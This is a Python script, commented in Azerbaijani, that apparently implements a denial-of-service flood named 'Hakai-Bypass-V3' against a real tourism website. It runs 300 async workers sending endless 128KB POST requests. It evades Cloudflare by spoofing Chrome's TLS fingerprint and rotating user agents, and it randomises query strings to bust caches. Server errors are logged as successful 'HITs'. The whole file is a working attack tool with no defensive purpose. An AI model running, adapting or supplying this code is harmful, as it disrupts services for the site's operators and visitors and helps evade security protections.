import asyncio
import random
import time
from curl_cffi.requests import AsyncSession

# --- HƏDƏF VƏ GÜC ---
TARGET = "https://armenia.travel/#"
CONCURRENCY = 300 # Railway RAM-ı üçün 300 idealdır

# Cloudflare-i çaşdırmaq üçün hər sorğuda fərqli user-agent
UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

async def attack(vid):
    """Hər worker real Chrome TLS barmaq izi ilə hərəkət edir"""
    payload = "data=" + ("X" * 128000) # 128KB Ağır POST datası
    
    while True:
        try:
            # impersonate="chrome120" Cloudflare bypassın şahıdır
            async with AsyncSession(impersonate="chrome110") as s:
                # URL randomizasiya (Cache deşmək üçün)
                u = f"{TARGET}?v={random.randint(1,999999)}&t={time.time()}"
                
                headers = {
                    "User-Agent": random.choice(UA_LIST),
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Cache-Control": "no-cache, no-store, must-revalidate",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": "https://www.google.com/"
                }

                # Ağır POST sorğusu
                resp = await s.post(u, data=payload, headers=headers, timeout=15)
                
                if resp.status_code >= 500:
                    print(f"[{vid}] HIT! Server Error: {resp.status_code}")
                elif resp.status_code == 403:
                    print(f"[{vid}] Cloudflare tərəfindən müvəqqəti bloklandı (IP-ni tanıdı)")
                else:
                    print(f"[{vid}] Delivered: {resp.status_code}")

        except Exception:
            print(f"[{vid}] Server bərpa olunur və ya çökdü...")
            await asyncio.sleep(0.5)

async def main():
    print(f"[*] Hakai-Bypass-V3 Başlayır. Hədəf: {TARGET}")
    tasks = []
    for i in range(CONCURRENCY):
        tasks.append(asyncio.create_task(attack(i)))
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
